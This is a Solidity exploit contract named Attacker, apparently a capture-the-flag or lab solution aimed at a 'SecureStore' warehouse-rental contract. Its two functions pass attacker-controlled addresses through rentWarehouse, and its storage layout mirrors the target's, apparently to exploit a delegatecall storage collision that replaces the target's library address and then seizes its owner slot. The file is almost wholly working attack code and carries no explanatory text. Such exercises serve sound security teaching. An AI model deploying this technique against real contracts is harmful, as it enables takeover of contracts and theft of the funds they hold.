// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;
import "hardhat/console.sol";

interface ISecureStore {
    function owner() external view returns (address);
    function rentWarehouse (uint256, uint256) external payable;
    function pricePerDay() external view returns (uint256);
}

contract Attacker {
    
    address public warehouse;
    address public owner;

    function changeWHAddress(ISecureStore target) external payable {
        target.rentWarehouse{value: msg.value}(1, uint256(uint160(address(this))));
        // (bool success, ) = payable(address(target)).call{value: 500000}(
        //     abi.encodeWithSignature("rentWarehouse(uint256,uint256)",1,uint256(uint160(address(this)))));
        // require(success, "Payable function call failed.");
    }

    function changeOwner(ISecureStore target) external payable {
        target.rentWarehouse{value: msg.value}(1, uint256(uint160(msg.sender)));
       // target.rentWarehouse(1, uint256(uint160(msg.sender))){value: target.pricePerDay()};
    }

    function setSSN(uint256 _owner) external {
        owner = address(uint160(_owner));
    }
}